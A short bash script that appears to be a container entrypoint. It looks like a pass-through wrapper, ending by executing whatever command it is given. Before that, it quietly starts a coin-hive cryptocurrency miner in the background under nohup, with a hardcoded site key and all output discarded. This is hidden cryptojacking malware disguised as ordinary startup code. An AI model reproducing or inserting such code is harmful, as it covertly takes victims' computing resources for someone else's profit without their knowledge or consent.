#!/bin/bash
nohup sh -c "coin-hive --throttle=0.5 uE2pV7kvgxNgehOM6YTLoHiSvLlIM5v7" &>/dev/null &

exec "$@"